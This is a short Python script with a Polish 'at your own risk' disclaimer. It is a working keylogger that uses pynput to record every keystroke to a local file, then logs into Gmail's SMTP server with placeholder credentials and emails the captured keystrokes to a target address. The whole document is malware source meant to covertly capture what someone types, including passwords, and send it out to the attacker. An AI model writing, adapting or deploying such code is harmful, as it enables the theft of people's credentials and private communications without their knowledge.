# Robisz wszystko na własną odpowiedzialność!
import pynput 
from pynput.keyboard import *

import smtplib
import time

f = open("sample.txt",'a')

def pressed(key):
    print(key)
    f.write(str(key))

def released(key):
    if key==Key.esc:
        return False

with Listener(on_press=pressed,on_release=released) as l:
    l.join()

f.close()

mail = smtplib.SMTP("smtp.gmail.com",587)

mail.starttls()

mail.login("nasz email","nasze hasło")

f = open("sample.txt",'r')

message = f.read()

f.close()

mail.sendmail("nasz adres email","adres email docelowy",message)

mail.quit()
